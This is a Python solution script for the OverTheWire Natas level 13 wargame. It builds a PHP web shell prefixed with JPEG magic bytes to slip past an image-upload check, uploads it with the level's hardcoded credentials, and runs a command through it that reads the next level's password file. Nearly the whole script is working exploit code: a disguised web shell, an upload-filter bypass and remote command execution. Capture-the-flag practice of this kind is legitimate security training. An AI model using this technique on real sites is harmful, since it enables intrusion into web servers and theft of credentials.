#!/usr/bin/python3.9

"""This script is a solution to Overthewire Natas level 13."""

import requests as r
from requests.auth import HTTPBasicAuth
from fake_useragent import UserAgent

url = "http://natas13.natas.labs.overthewire.org/"

lvl_user = "natas13"
lvl_pass = "lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9"

headers = {
    "User-Agent": UserAgent().random
    }

web_shell = open("cmd-8569eadb.php", "wb")
web_shell.write(b'\xFF\xD8\xFF\xDB @<?php system($_GET[\'cmd\']); ?>')
web_shell.close()


files = {
    'uploadedfile': open('cmd-8569eadb.php' ,'rb')
    }

try:
    res_upload = r.post(
        url,
        files=files,
        data={"filename": "cmd-8569eadb.php"},
        headers=headers, 
        auth=HTTPBasicAuth(lvl_user, lvl_pass))

    if res_upload.status_code == 200:
        web_shell_path = res_upload.text.split("\n")[-5]
        web_shell_path = url + web_shell_path.split('"')[1]
        print("[WEB_SHELL]", web_shell_path)

    res = r.get(
        web_shell_path,
        files=files,
        params={"cmd": "cat /etc/natas_webpass/natas14"},
        headers=headers, 
        auth=HTTPBasicAuth(lvl_user, lvl_pass))

    status = res.status_code
    
    if status == 200:
        password = res.text.split("\n")[0]
        password = password.split('@')[-1] 
except Exception as e:
    print("[ERROR]", e, "\n")
    exit(-1)

if password and password.isalnum() and len(password) == 32:
    print("[PASSWORD]", password)
else:
    print(
        f"[FAIL] - [Status: {status}]",
        f"[Password({len(password)}): {password}]")
